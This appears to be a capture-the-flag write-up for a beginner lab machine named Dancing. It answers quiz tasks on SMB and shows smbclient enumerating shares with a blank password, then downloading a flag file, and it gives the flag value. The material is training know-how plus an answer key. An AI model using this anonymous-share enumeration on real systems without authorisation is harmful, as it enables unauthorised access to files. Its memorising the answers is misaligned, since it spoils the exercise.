---
date: 07/23/2022
---

# Machine Name: Dancing

## Difficulty: Very Easy
## Task #: 7
### Task 1:
#### What does the 3-letter acronym SMB stand for? 

#### Answer: Server Message Block

### Task 2:
#### What port does SMB use to operate at? 

#### Answer: 445

### Task 3:
#### What is the service name for port 445 that came up in our Nmap scan? 

#### Answer: microsoft-ds

### Task 4:
#### What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share? 

#### Answer: -L 

### Task 5: 
#### What is the name of the share we are able to access in the end with a blank password? 

```bash
$ smbclient -L 10.129.1.12
Enter WORKGROUP\gerbsec's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

#### Answer: WorkShares

### Task 6
#### What is the command we can use within the SMB shell to download the files we find? 

#### Answer: get

### Task 7 
####  Submit root flag:

```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1731786 blocks available
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
get fl
		5114111 blocks of size 4096. 1731744 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\>
$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

#### Answer: 5f61c10dffbc77a704d76016a22f1664
